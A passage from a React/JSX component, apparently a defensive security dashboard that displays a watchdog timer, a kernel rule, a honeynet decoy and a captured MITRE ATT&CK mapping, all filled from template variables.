                <span className="flex items-center gap-1 text-[11px] font-mono text-emerald-400">
                  <Clock className="w-3 h-3" /> Watchdog: {watchdogSeconds}s
                </span>
              </div>
              <div className="p-2 rounded bg-black/60 font-mono text-[11px] text-amber-300 border border-amber-500/20 break-all select-all">
                {scenario.kernelRule}
              </div>
              <div className="flex items-center justify-between text-[11px] text-slate-400">
                <span>Rollback Watchdog: <b className="text-emerald-400">ARMED</b> (Zero False-Positive Risk)</span>
                <span>Active Honeynet: <b className="text-purple-400">{scenario.honeynetDecoy}</b></span>
              </div>
            </div>

            {/* Continual Learner / TTP Capture */}
            <div className="p-2.5 rounded-lg border border-purple-500/30 bg-purple-950/20 text-xs">
              <span className="font-bold text-purple-300 block mb-1">
                Episodic Replay & MITRE ATT&CK Mapping
              </span>
              <p className="text-[11px] text-purple-200/90 font-mono">
                {scenario.capturedTtp}
              </p>
              <span className="text-[10px] text-slate-400 mt-1 block">
                Saved to Elastic Weight Consolidation (EWC) memory replay buffer for continual model adaptation.
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
